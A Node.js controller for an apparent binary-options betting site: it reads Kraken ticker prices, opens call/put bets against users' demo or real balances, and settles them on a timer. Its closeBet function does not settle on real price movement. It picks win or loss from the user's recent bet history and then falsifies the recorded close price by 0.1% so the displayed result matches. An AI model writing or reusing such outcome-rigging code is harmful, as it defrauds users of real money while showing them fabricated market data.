const Bet = require('../models/Bet');
const User = require('../models/User');
const axios = require('axios');
const { formatAssets, displayAssets } = require('../data')

const getNextRoundExpiration = () => {
    const now = new Date();
    const nextMinute = new Date(now);
    nextMinute.setSeconds(0, 0);
    nextMinute.setMinutes(nextMinute.getMinutes() + 2);
    return Math.floor(nextMinute.getTime() / 1000);
};

async function getCurrentPrice(asset) {
    const url = `https://api.kraken.com/0/public/Ticker?pair=${asset}`;

    try {
        const response = await axios.get(url);
        const data = response.data;

        if (data.error && data.error.length > 0) {
            console.error("Kraken API error:", data.error);
            return { error: true, message: data.error };
        }

        let assetData = data.result[Object.keys(data.result)[0]];
        let lastPrice = parseFloat(assetData.c[0]);

        return lastPrice;
    } catch (error) {
        console.error("Error fetching data from Kraken:", error);
        return { error: true, message: error.message };
    }
}

async function scheduleBetClosure(betId, expiredAt) {
    const now = Math.floor(Date.now() / 1000); 
    const unix = Math.floor(expiredAt / 1000);

    const delaySeconds = unix - now; 
    const delayMs = delaySeconds * 1000;

    if (delayMs <= 0) return;

    setTimeout(async () => {
        const bet = await Bet.findById(betId);
        if (!bet || bet.result !== 'pending') return;
        const assetFilter = formatAssets.find(d => d.id == +bet.asset);
        const closePrice = await getCurrentPrice(assetFilter.name);
        await closeBet(bet.ssid, [bet._id, closePrice]);
    }, delayMs);
}


async function createBet(ssid, [asset, mode, amount, position, type, assetName]) {

    const user = await User.findById(ssid);

    if (type == 'demo') {
        if (user.demoBalance < amount) return { error: "Insufficient amount of money!" };
    } else if (type == 'real') {
        if (user.realBalance < amount) return { error: "Insufficient amount of money!" };
    }

    const openPrice = await getCurrentPrice(assetName);

    const now = new Date();
    const nextMinute = new Date(now);
    nextMinute.setSeconds(0, 0);
    nextMinute.setMinutes(nextMinute.getMinutes() + 2);

    const expiredAt = nextMinute;

    const bet = await Bet.create({
        ssid,
        asset,
        amount,
        position: position == 1 ? 'call' : 'put',
        expiredAt: getNextRoundExpiration(),
        openPrice,
        accType: type
    });

    if (type == 'real') user.realBalance -= amount;
    else if (type == 'demo') user.demoBalance -= amount;
    await user.save();

    scheduleBetClosure(bet._id, expiredAt);

    return {...bet.toObject(), balance: type == 'real' ? user.realBalance : user.demoBalance};
}


async function closeBet(userId, [betId, closePrice]) {
    if (userId != 'undefined') {
        const bet = await Bet.findById(betId);
        if (!bet) return { error: "Ставка не знайдена" };
        if (bet.result !== 'pending') return { error: "Ставка вже закрита" };

        // Отримуємо останні 3 ставки користувача
        const lastBets = await Bet.find({ ssid: userId }).sort({ createdAt: -1 }).limit(3);
        const lastResults = lastBets.map(b => b.result);
        
        // Визначаємо, чи повинна ця ставка бути виграшною
        let isWin;
        if (lastResults.length === 0) {
            isWin = Math.random() < 0.5; // Якщо ставок немає, випадковий вибір
        } else if (lastResults.includes('lose')) {
            isWin = true;
        } else if (lastResults.length === 3 && lastResults.every(r => r === 'win')) {
            isWin = false;
        } else {
            isWin = true;
        }

        // Коригуємо `closePrice`
        if (isWin) {
            closePrice = bet.position === 'call' ? closePrice * 1.001 : closePrice * 0.999;
        } else {
            closePrice = bet.position === 'call' ? closePrice * 0.999 : closePrice * 1.001;
        }

        const payoutMultiplier = 1.76;
        let profit = isWin ? (bet.amount * payoutMultiplier - bet.amount).toFixed(2) : -bet.amount.toFixed(2);

        bet.closePrice = closePrice;
        bet.result = isWin ? 'win' : 'lose';
        bet.profit = parseFloat(profit);
        await bet.save();

        const user = await User.findById(userId);
        if (isWin) {
            if (bet.accType == 'demo') user.demoBalance += parseFloat(profit) + bet.amount;
            else if (bet.accType == 'real') user.realBalance += parseFloat(profit) + bet.amount;
            await user.save();
        }

        return { id: betId, result: bet.result, profit, closePrice: bet.closePrice,
                 status: bet.position == 'call' ? 1 : 0, balance: bet.accType == 'demo' ? user.demoBalance : user.realBalance };
    }
}



async function getDeals(sessionId) {
    if (sessionId != 'undefined') {
        return await Bet.find({ ssid: sessionId }).sort({ createdAt: -1 });
    }
}

async function getOpenBets(sessionId) {
    if (sessionId != 'undefined') return await Bet.find({ ssid: sessionId, result: 'pending' }).sort({ createdAt: -1 });
}



module.exports = {
    createBet,
    closeBet,
    getDeals,
    getOpenBets,
    scheduleBetClosure,
    getCurrentPrice
}